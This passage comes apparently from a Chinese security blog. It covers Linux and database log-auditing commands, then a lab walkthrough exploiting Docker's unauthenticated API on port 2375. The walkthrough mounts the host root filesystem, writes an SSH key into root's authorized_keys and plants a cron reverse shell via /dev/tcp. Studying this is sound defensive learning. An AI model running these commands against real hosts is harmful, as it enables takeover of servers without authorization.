class="built_in">tail</span>  -n  10   test.log   <span class="comment">#查询日志尾部最后10行的日志;</span></span><br><span class="line"><span class="built_in">tail</span>  -n +10   test.log   <span class="comment">#查询10行之后的所有日志;</span></span><br><span class="line"><span class="built_in">tail</span>  -fn 10   test.log   <span class="comment">#循环实时查看最后10行记录(最常用的)</span></span><br><span class="line"> <span class="built_in">tail</span> -fn 1000 test.log | grep <span class="string">&#x27;关键字&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> -f xxx.log             <span class="comment">#实时刷新最新日志</span></span><br><span class="line"><span class="built_in">tail</span> -100f xxx.log      <span class="comment">#实时刷新最新的100行日志</span></span><br><span class="line"><span class="built_in">tail</span> -100f xxx.log | grep [关键字]     <span class="comment">#查找最新的一百行中与关键字匹配的行</span></span><br><span class="line"><span class="built_in">tail</span> -100f xxx.log | grep <span class="string">&#x27;2019-10-29 16:4[0-9]&#x27;</span>    <span class="comment">#查找最新的100行中时间范围在2019-10-29 16:40-2019-10-29 16:49范围中的行</span></span><br><span class="line"><span class="built_in">tail</span> -1000f xxx.log | grep -A 5 [关键字] <span class="comment">#查看最新的1000行中与关键字匹配的行加上匹配行后的5行</span></span><br></pre></td></tr></table></figure><blockquote><p>如果一次性查询的数据量太大,可以进行翻页查看，例如:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -n 4700  aa.log |more -1000 </span><br><span class="line"><span class="comment">#可以进行多屏显示(ctrl + f 或者 空格键可以快捷键)</span></span><br></pre></td></tr></table></figure></blockquote><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p>跟tail是相反的head是看前多少行日志</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">head</span> -n  10  test.log   <span class="comment">#查询日志文件中的头10行日志;</span></span><br><span class="line"><span class="built_in">head</span> -n -10  test.log   <span class="comment">#查询日志文件除了最后10行的其他所有日志;</span></span><br></pre></td></tr></table></figure><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#cat 是由第一行到最后一行连续显示在屏幕上。一次显示整个文件 :</span></span><br><span class="line"><span class="built_in">cat</span> filename</span><br><span class="line"><span class="comment">#从键盘创建一个文件 :</span></span><br><span class="line"><span class="built_in">cat</span> &gt; filename</span><br><span class="line"><span class="comment">#将几个文件合并为一个文件：</span></span><br><span class="line"><span class="built_in">cat</span> file1 file2 &gt; file <span class="comment">#只能创建新文件,不能编辑已有文件.</span></span><br><span class="line"><span class="comment">#将一个日志文件的内容追加到另外一个 :</span></span><br><span class="line"><span class="built_in">cat</span> -n textfile1 &gt;&gt; textfile2</span><br><span class="line"><span class="comment">#清空一个日志文件:</span></span><br><span class="line"><span class="built_in">cat</span> : &gt;textfile2</span><br></pre></td></tr></table></figure><blockquote><p>注意：&gt; 意思是创建，&gt;&gt;是追加。千万不要弄混了。</p><p>cat其他参数参考tail</p></blockquote><h3 id="more"><a href="#more" class="headerlink" title="more"></a>more</h3><p>more命令是一个基于vi编辑器文本过滤器，它以全屏幕的方式按页显示文本文件的内容，支持vi中的关键字定位操作。more名单中内置了若干快捷键，常用的有H（获得帮助信息），Enter（向下翻滚一行），空格（向下滚动一屏），Q（退出命令）。more命令从前向后读取文件，因此在启动时就加载整个文件。</p><p>该命令一次显示一屏文本，满屏后停下来，并且在屏幕的底部出现一个提示信息，给出至今己显示的该文件的百分比：–More–（XX%）</p><p><code>more的语法：more 文件名</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Enter 向下n行，需要定义，默认为1行</span><br><span class="line">Ctrl f 向下滚动一屏</span><br><span class="line">空格键 向下滚动一屏</span><br><span class="line">Ctrl b 返回上一屏</span><br><span class="line">= 输出当前行的行号</span><br><span class="line">:f 输出文件名和当前行的行号</span><br><span class="line">v 调用vi编辑器</span><br><span class="line">!命令 调用Shell，并执行命令</span><br><span class="line">q退出more</span><br></pre></td></tr></table></figure><h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><p>这个命令可以查找日志文件特定的一段 , 根据时间的一个范围查询，可以按照行号和时间范围查询</p><ul><li><strong>按照行号</strong></li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sed -n <span class="string">&#x27;5,10p&#x27;</span> filename <span class="comment">#这样你就可以只查看文件的第5行到第10行。</span></span><br></pre></td></tr></table></figure><ul><li><strong>按照时间段</strong></li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sed -n <span class="string">&#x27;/2014-12-17 16:17:20/,/2014-12-17 16:17:36/p&#x27;</span>  test.log</span><br></pre></td></tr></table></figure><h3 id="less"><a href="#less" class="headerlink" title="less"></a>less</h3><p>less命令在查询日志时，一般流程是这样的</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">less log.log</span><br><span class="line"><span class="comment">#shift + G 命令到文件尾部  然后输入 ？加上你要搜索的关键字例如 ？1213</span></span><br><span class="line"><span class="comment">#按 n 向上查找关键字</span></span><br><span class="line"><span class="comment">#shift+n  反向查找关键字</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#less与more类似，使用less可以随意浏览文件，而more仅能向前移动，不能向后移动，而且 less 在查看之前不会加载整个文件。</span></span><br><span class="line">less log2013.log <span class="comment">#查看文件</span></span><br><span class="line">ps -ef | less   ps<span class="comment">#查看进程信息并通过less分页显示</span></span><br><span class="line"><span class="built_in">history</span> | less   <span class="comment">#查看命令历史使用记录并通过less分页显示</span></span><br><span class="line">less log2013.log log2014.log   <span class="comment">#浏览多个文件</span></span><br></pre></td></tr></table></figure><p>常用命令参数</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-b &lt;缓冲区大小&gt; 设置缓冲区的大小</span><br><span class="line">-g 只标志最后搜索的关键词</span><br><span class="line">-i 忽略搜索时的大小写</span><br><span class="line">-m 显示类似more命令的百分比</span><br><span class="line">-N 显示每行的行号</span><br><span class="line">-o &lt;文件名&gt; 将less 输出的内容在指定文件中保存起来</span><br><span class="line">-Q 不使用警告音</span><br><span class="line">-s 显示连续空行为一行</span><br><span class="line">/字符串：向下搜索<span class="string">&quot;字符串&quot;</span>的功能</span><br><span class="line">?字符串：向上搜索<span class="string">&quot;字符串&quot;</span>的功能</span><br><span class="line">n：重复前一个搜索（与 / 或 ? 有关）</span><br><span class="line">N：反向重复前一个搜索（与 / 或 ? 有关）</span><br><span class="line">b 向后翻一页</span><br><span class="line">h 显示帮助界面</span><br><span class="line">q 退出less 命令</span><br></pre></td></tr></table></figure><h2 id="习惯常用"><a href="#习惯常用" class="headerlink" title="习惯常用"></a>习惯常用</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">history</span> <span class="comment"># 所有的历史记录</span></span><br><span class="line"><span class="built_in">history</span> | grep XXX  <span class="comment"># 历史记录中包含某些指令的记录</span></span><br><span class="line"><span class="built_in">history</span> | more <span class="comment"># 分页查看记录</span></span><br><span class="line"><span class="built_in">history</span> -c <span class="comment"># 清空所有的历史记录</span></span><br><span class="line">!! 重复执行上一个命令</span><br><span class="line">查询出来记录后选中 :　!323</span><br><span class="line"><span class="built_in">tail</span> -f /var/log/apache2/access.log    <span class="comment">#查看实时日志</span></span><br><span class="line"><span class="built_in">tail</span> -f -n 50 auth.log</span><br><span class="line">last -f /var/log/wtmp         <span class="comment">#Linux查看/var/log/wtmp文件查看可疑IP登陆</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/secure |grep 自定IP      <span class="comment">#查看/var/log/secure文件寻找可疑IP登陆次数</span></span><br></pre></td></tr></table></figure><h2 id="linux日志文件说明"><a href="#linux日志文件说明" class="headerlink" title="linux日志文件说明"></a>linux日志文件说明</h2><blockquote><p>常见Linux日志</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/var/log/message <span class="comment">#系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一</span></span><br><span class="line">/var/log/secure <span class="comment">#与安全相关的日志信息</span></span><br><span class="line">/var/log/maillog <span class="comment">#与邮件相关的日志信息</span></span><br><span class="line">/var/log/cron <span class="comment">#与定时任务相关的日志信息</span></span><br><span class="line">/var/log/spooler <span class="comment">#与UUCP和news设备相关的日志信息</span></span><br><span class="line">/var/log/boot.log <span class="comment">#守护进程启动和停止相关的日志消息</span></span><br><span class="line">/var/log/wtmp <span class="comment">#该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件</span></span><br></pre></td></tr></table></figure><h2 id="ubuntu日志说明"><a href="#ubuntu日志说明" class="headerlink" title="ubuntu日志说明"></a>ubuntu日志说明</h2><blockquote><p>Ubuntu 系统的日志信息保存路径为： &#x2F;var&#x2F;log&#x2F;，如：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth - 安全验证日志</span><br><span class="line">boot - 启动日志</span><br><span class="line">kern - 内核日志</span><br><span class="line">syslog - 系统日志</span><br><span class="line">wtmp - 与/var/run/utmp 一起记录了连接时间日志</span><br><span class="line">Xorg - 显示服务日志</span><br></pre></td></tr></table></figure><p><strong>&#x2F;var&#x2F;log&#x2F; 目录日志文件说明</strong></p><blockquote><p>[1] - <code>alternatives.log</code> - 记录更新替代信息.</p><p>[2] - <code>apport.log</code> - 记录应用程序崩溃信息.</p><p>[3] - <code>apt/</code> - 记录 apt-get 安装卸载软件的信息.</p><p>[4] - <code>auth.log</code> - 记录用户登录及身份认证信息.</p><p>[5] - <code>boot.log</code> - 记录系统启动时的日志信息.</p><p>[6] - <code>btmp</code> - 记录所有系统失败启动信息，如登录系统失败的用户、时间、IP 等信息.</p><p>[7] - <code>cpus/</code> - 记录所有打印信息的日志.</p><p>[8] - <code>dist-upgrade/</code> - 记录更新方式为<code>dist-upgrade</code>的信息.</p><p>[9] - <code>dmesg</code> - 内核缓冲信息(kernel ringbuffer). 如，系统启动时，显示屏幕上的与硬件有关的信息.</p><p>[10] - <code>dpkg.log</code> - 记录安装或dpkg命令清除软件包的日志.</p><p>[11] - <code>debug</code> - 调试日志信息.</p><p>[12] - <code>faillog</code> - 记录用户登录失败信息以及错误登录命令.</p><p>[13] - <code>fontconfig.log</code> - 与字体配置有关的信息.</p><p>[14] - <code>fsck</code> - 文件系统日志.</p><p>[15] - <code>kern.log</code> - 记录内核产生的日志，有助于在定制内核时解决问题.</p><p>[16] - <code>lastlog</code> - 记录所有用户的最近信息，如最后一次用户成功登录的时间、登录 IP 等信息. 需要用 <code>lastlog</code> 命令查看内容.</p><p>[17] - <code>syslog</code> - 记录的是系统日志服务.</p><p>[18] - <code>wtmp</code> - 记录用户登录系统的信息，以及使用命令查看该文件的用户信息等.</p><p>[19] - <code>Xorg.*.log</code> - 记录 Xorg 显示服务的日志信息.</p></blockquote><h1 id="数据库日志审计"><a href="#数据库日志审计" class="headerlink" title="数据库日志审计"></a>数据库日志审计</h1><blockquote><p>（Mysql、Msql、Oracle等）日志分析（爆破注入）</p><p>其他数据库也是一样 查看日志存储位置，然后看日志，注意字段信息</p></blockquote><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等，对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景和溯源攻击源</p><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="日志启用并查看路径"><a href="#日志启用并查看路径" class="headerlink" title="日志启用并查看路径"></a>日志启用并查看路径</h3><blockquote><p>mysql的命令</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;%general%&quot;;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log <span class="operator">=</span> <span class="string">&#x27;On&#x27;</span>;</span><br><span class="line"># 这里可以设置mysql日志存放目录</span><br><span class="line"><span class="keyword">SET</span> GLABAL general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/lib/mysql/mysql.log&#x27;</span> </span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210220610994.png" alt="image-20221022061002516"></p><h2 id="Sql-server"><a href="#Sql-server" class="headerlink" title="Sql server"></a>Sql server</h2><h3 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h3><blockquote><p>注意对应数据库</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210220624830.png" alt="image-20221022061258643" style="zoom:50%;" /><h3 id="配置数据库的日志属性"><a href="#配置数据库的日志属性" class="headerlink" title="配置数据库的日志属性"></a>配置数据库的日志属性</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210220624642.png" alt="image-20221022061705200" style="zoom:50%;" /><h3 id="对Mssql进行攻击并实时查看日志"><a href="#对Mssql进行攻击并实时查看日志" class="headerlink" title="对Mssql进行攻击并实时查看日志"></a>对Mssql进行攻击并实时查看日志</h3><blockquote><p>mssql实时监控工具：</p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210220624610.png" alt="image-20221022062107481" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210220624687.png" alt="image-20221022062141912" style="zoom:50%;" /><h2 id="数据库-日志审计工具"><a href="#数据库-日志审计工具" class="headerlink" title="数据库  日志审计工具"></a>数据库  日志审计工具</h2><h1 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h1><h2 id="日志被删"><a href="#日志被删" class="headerlink" title="日志被删"></a>日志被删</h2><blockquote><p>攻击者有可能会删除日志，这种情况下，两条思路：</p><ul><li>尝试恢复日志</li><li>查漏洞模拟渗透测试寻找攻击源</li></ul></blockquote><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><a href="https://www.aiuai.cn/aifarm1200.html#:~:text=Ubuntu%20-%20%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6.%20Ubuntu%20%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E4%BF%9D%E5%AD%98%E8%B7%AF%E5%BE%84%E4%B8%BA%EF%BC%9A%20%2Fvar%2Flog%2F%20%EF%BC%8C%E5%A6%82%EF%BC%9A.%20auth,wtmp%20-%20%E4%B8%8E%20%2Fvar%2Frun%2Futmp%20%E4%B8%80%E8%B5%B7%E8%AE%B0%E5%BD%95%E4%BA%86%E8%BF%9E%E6%8E%A5%E6%97%B6%E9%97%B4%E6%97%A5%E5%BF%97.%20Xorg%20-%20%E6%98%BE%E7%A4%BA%E6%9C%8D%E5%8A%A1%E6%97%A5%E5%BF%97.">Ubuntu - 系统日志文件</a></p><p><a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">取证实战篇-Windows日志分析</a></p><p><a href="https://mp.weixin.qq.com/s/uiFthGCgGg3rxx3sv3Q_yQ">流量分析与日志溯源实战技巧</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 蓝队 </category>
          
          <category> 日志审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x12 - Docker未授权访问漏洞</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-Docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-Docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>docker未授权访问漏洞</p><p>关于docker的漏洞也有一些，docker容器逃逸等以后有时间再来学习~~</p><p>关于docker –privilege参数也比较危险，有实际再来学习</p><h1 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h1><h2 id="未授权概述"><a href="#未授权概述" class="headerlink" title="未授权概述"></a>未授权概述</h2><p>未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面配置不当导致其他用户可以无需认证授权直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。</p><h2 id="常见未授权访问漏洞"><a href="#常见未授权访问漏洞" class="headerlink" title="常见未授权访问漏洞"></a>常见未授权访问漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis 未授权访问漏洞</span><br><span class="line">Docker 未授权访问漏洞</span><br><span class="line">MongoDB 未授权访问漏洞</span><br><span class="line">Jenkins 未授权访问漏洞</span><br><span class="line">Memcached 未授权访问漏洞</span><br><span class="line">JBOSS 未授权访问漏洞</span><br><span class="line">VNC 未授权访问漏洞</span><br><span class="line">ZooKeeper 未授权访问漏洞</span><br><span class="line">Rsync 未授权访问漏洞</span><br><span class="line">Atlassian Crowd 未授权访问漏洞</span><br><span class="line">CouchDB 未授权访问漏洞</span><br><span class="line">Elasticsearch 未授权访问漏洞</span><br><span class="line">Hadoop 未授权访问漏洞</span><br><span class="line">Jupyter Notebook 未授权访问漏洞</span><br></pre></td></tr></table></figure><h1 id="Docker未授权访问"><a href="#Docker未授权访问" class="headerlink" title="Docker未授权访问"></a>Docker未授权访问</h1><p>如果在docker上配置了远程访问，docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，如果没有做限制访问来源的话，攻击者就可以通过Docker未授权来控制服务器。</p><p>当docker守护进程监听在0.0.0.0，外网可访问，没有使用iptable等限制可连接的来源ip，可以通过docker客户端远程开启docker镜像，并进入container内部，而docker运行container 可以将本地文件或目录作为volume挂载到container内，并且在container内部，这些文件和目录是可以修改的。</p><p>两种方法来介绍如何通过docker未授权获取宿主机的权限：</p><blockquote><ol><li><p>利用挂载目录的方式写ssh公钥getshell </p></li><li><p>利用写定时任务反弹shell</p></li></ol></blockquote><h2 id="docker简介"><a href="#docker简介" class="headerlink" title="docker简介"></a>docker简介</h2><h3 id="Docker基本组成："><a href="#Docker基本组成：" class="headerlink" title="Docker基本组成："></a>Docker基本组成：</h3><blockquote><ul><li><strong>DockerClient 客户端</strong> 和 <strong>Dockerdaemon 守护进程</strong></li></ul><blockquote><p>Docker是C&#x2F;S（客户端client-服务器server）架构模式。</p><p>Docker通过客户端连接守护进程，通过命令向守护进程发出请求，守护进程通过一系列的操作返回结果。</p><p>Docker客户端可以连接本地或者远程的守护进程。</p><p>Docker客户端和服务器通过socket或RESTful API进行通信。</p></blockquote><ul><li>DockerImage 镜像</li></ul><blockquote><p>镜像是容器的基石，容器基于镜像启动和运行。镜像就好像容器的源代码，保存了容器各种启动的条件。镜像是一个层叠的只读文件系统。</p></blockquote><ul><li>DockerContainer 容器</li></ul><blockquote><p>容器通过镜像来启动，容器是docker的执行来源，可以执行一个或多个进程。镜像相当于构建和打包阶段，容器相当于启动和执行阶段。容器启动时，Docker容器可以运行、开始、停止、移动和删除。每一个Docker容器都是独立和安全的应用平台</p></blockquote><ul><li>DockerRegistry 仓库</li></ul><blockquote><p>docker仓库用来保存镜像。docker仓库分为公有和私有。Docker公司提供公有仓库docker hub，网址：<a href="https://hub.docker.com/%E3%80%82%E6%88%91%E4%BB%AC%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%88%9B%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%A7%81%E6%9C%89%E7%9A%84%E4%BB%93%E5%BA%93%E3%80%82">https://hub.docker.com/。我们也可以创建自己私有的仓库。</a></p></blockquote></blockquote><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>攻击者利用 dockerclient 或者 http 直接请求就可以访问这个API，可能导致敏感信息泄露，也可以删除Docker上的数据。攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol><li>直接使用合天网安的环境</li></ol><blockquote><p> <a href="https://www.hetianlab.com/expc.do?ce=2afbad05-7336-4e91-b3b1-a6d3d08f7054">实验:Docker未授权访问漏洞</a></p></blockquote><ol start="2"><li>vulhub</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/vulhub/docker/unauthorized-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="发现docker未授权漏洞"><a href="#发现docker未授权漏洞" class="headerlink" title="发现docker未授权漏洞"></a>发现docker未授权漏洞</h3><blockquote><p>进行信息收集，寻找可能利用的点</p></blockquote><ol><li>通过nmap对目标进行信息收集,发现如下端口开放</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#勘测端口</span></span><br><span class="line">nmap -sS -p- -T4 -Pn 124.223.217.243</span><br><span class="line"><span class="comment">#检测版本要带上-sV</span></span><br><span class="line">nmap -sS -p- -T4 -sV 124.223.217.243</span><br><span class="line"><span class="comment">#检测是否存在常见漏洞</span></span><br><span class="line">nmap -sS -p- -T4 -sV -script=vuln 124.223.217.243</span><br></pre></td></tr></table></figure><blockquote><p><strong>结果：</strong></p><ul><li><p>2375端口：docker远程操控（通过这个端口对远程docker deaom进行操作）</p></li><li><p>还有一些其他开放的端口，redis也是可以利用的</p></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">53/tcp    open     domain         ISC BIND 9.16.1 (Ubuntu Linux)</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC #100000)</span><br><span class="line">2222/tcp  open     ssh            OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</span><br><span class="line">2375/tcp  open     docker         Docker 18.03.0-ce</span><br><span class="line">6379/tcp  open     redis          Redis key-value store 3.0.7</span><br><span class="line">13820/tcp filtered dsmcc-passthru</span><br></pre></td></tr></table></figure></blockquote><ol start="2"><li>若目标开放2375端口，通过浏览器进行访问，如果页面显示message “page not found” 代表存在漏洞</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209261659545.png" alt="image-20220926165414901" style="zoom: 50%;" /><ol start="3"><li>如若页面空白显示，则可以通过如下方式获得是否存在漏洞</li></ol><blockquote><p>1）可以通过info获取docker信息</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209261708569.png" alt="image-20220926170819397" style="zoom:50%;" /><p>2）获取image列表</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209261709575.png" alt="image-20220926170921423" style="zoom:50%;" /></blockquote><h3 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h3><h4 id="使用docker命令连接目标机器"><a href="#使用docker命令连接目标机器" class="headerlink" title="使用docker命令连接目标机器"></a>使用docker命令连接目标机器</h4><ol><li>通过docker client使用-H参数连接目标主机的docker，并使用<code>ps -a</code>命令查询目标系统运行的所有容器</li></ol><blockquote><p><code>-H, --host list          Daemon socket(s) to connect to</code></p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker -H tcp://124.223.217.243 ps -a    <span class="comment">#列出所有容器</span></span><br><span class="line">docker -H tcp://124.223.217.243 images<span class="comment">#列出所有镜像</span></span><br></pre></td></tr></table></figure><blockquote><p>需要利用该漏洞，当然先要进入容器，然后才能进行其他操作~~</p></blockquote><h4 id="进入容器的方法一："><a href="#进入容器的方法一：" class="headerlink" title="进入容器的方法一："></a>进入容器的方法一：</h4><ol><li>首先docker client连接目标，ps -a 查看哪些容器已经停止：</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker -H tcp://124.223.217.243 ps -a    #列出所有容器,exited表示已停止的容器</span><br></pre></td></tr></table></figure><ol start="2"><li>通过start命令启动一个已经停止的容器：</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker -H tcp://124.223.217.24 start container-id</span><br></pre></td></tr></table></figure><ol start="3"><li>attach命令连接一个已经启动的容器：</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker -H tcp://124.223.217.24 attach container-id</span><br></pre></td></tr></table></figure><blockquote><p>这样就能够获得一个docker容器的shell。</p></blockquote><h4 id="进入容器的方法二"><a href="#进入容器的方法二" class="headerlink" title="进入容器的方法二"></a>进入容器的方法二</h4><ol><li>新运行一个容器并将entrypoint设置为**&#x2F;bin&#x2F;bash或者&#x2F;bin&#x2F;sh<strong>（也就是进入容器的shell是bash还是sh），挂载的目录设置为</strong>目标机器的根目录挂载至&#x2F;mnt目录下**（需要root权限启动docker）</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#vulhub拉去的实验环境里面自带一个镜像~alphine</span></span><br><span class="line"><span class="comment">#创建容器，-v 宿主机目录:容器中目录</span></span><br><span class="line">docker -H tcp://124.223.217.243 run -it -v /:/mnt --entrypoint /bin/bash feb5d9fea6a5（镜像<span class="built_in">id</span>）</span><br></pre></td></tr></table></figure><ol start="2"><li>也可以使用docker命令创建一个busybox容器，并将宿主机的磁盘挂载到容器中</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker -H tcp://124.223.217.243:2375 run -it -v /:/mnt busybox <span class="built_in">chroot</span> /mnt sh</span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>docker run只在第一次运行时使用，将镜像放到容器中，以后再次启动这个容器时，只需要使用命令docker start 即可。</p><p>docker run相当于执行了两步操作：将镜像放入容器中（docker create）,然后将容器启动（docker start）。</p></blockquote><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><blockquote><ul><li>docker未授权写ssh公钥获得shell</li><li>docker未授权写定时任务获得shell</li></ul></blockquote><h4 id="docker未授权写ssh公钥获得shell："><a href="#docker未授权写ssh公钥获得shell：" class="headerlink" title="docker未授权写ssh公钥获得shell："></a>docker未授权写ssh公钥获得shell：</h4><ol><li><p>启动一个容器，挂载宿主机的&#x2F;mnt目录（上一步骤已挂载），之后将攻击者的ssh公钥~&#x2F;.ssh&#x2F;id_rsa.pub的内容写到入宿主机的&#x2F;root&#x2F;.ssh&#x2F;authorized_keys文件中，之后就可以用root账户直接登录了。</p></li><li><p>首先kali生成id_rsa公钥：ssh-keygen -t rsa</p></li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="comment">#生成的公钥在/root/.ssh/ 目录下.</span></span><br></pre></td></tr></table></figure><ol start="3"><li>将生成公钥写入到目标&#x2F;root&#x2F;.ssh&#x2F;authorized_keys文件中：</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#进入容器后</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;public-key&quot;</span> &gt; /mnt/root/.ssh/authorized_keys</span><br><span class="line"><span class="comment">#&gt;这个代表的意思为覆盖，&gt;&gt;代表为追加</span></span><br></pre></td></tr></table></figure><blockquote><p>此处的路径为之前所挂载的路径，如果挂载root路径那就为&#x2F;root&#x2F;root&#x2F;.ssh</p></blockquote><ol start="4"><li>写入后即可通过ssh进行连接，获取宿主机的shell,但是vulhub的实验环境本身就是docker拉起的docker未授权环境，在docker里面的docker开启的alphine容器，并没有ssh工具，所以你懂的~只是提供思路，拿shell可以定时任务</li></ol><h4 id="docker未授权写定时任务获得shell"><a href="#docker未授权写定时任务获得shell" class="headerlink" title="docker未授权写定时任务获得shell"></a>docker未授权写定时任务获得shell</h4><blockquote><p>启动一个容器，挂载宿主机的目录（此前已挂载），之后将反弹shell的脚本写入到&#x2F;etc&#x2F;crontab中，攻击机nc -lvvp port会得到一个反弹的shell。将反弹shell的脚本写入到&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root（centos系统）或&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root(ubuntu系统)</p></blockquote><ol><li>Kali开启监听：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1212</span><br></pre></td></tr></table></figure><ol start="2"><li>写入反弹shell的脚本</li></ol><p>*****为定时任务 此处为每分钟执行一次 <code>/bin/bash -i &gt;&amp; /dev/tcp/124.223.217.243/1231 0&gt;&amp;1</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot; */1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/124.223.217.243/1212 0&gt;&amp;1 &quot; &gt; /mnt/var/spool/cron/root</span><br></pre></td></tr></table></figure><p>4）弹回目标shell</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><blockquote><ul><li>1）设置ACL，只允许信任ip连接对应端口</li><li>2）开启TLS，使用生成的证书进行认证：</li></ul><blockquote><p><a href="https://docs.docker.com/engine/security/protect-access/">https://docs.docker.com/engine/security/protect-access/</a></p></blockquote></blockquote><h1 id="refer"><a href="#refer" class="headerlink" 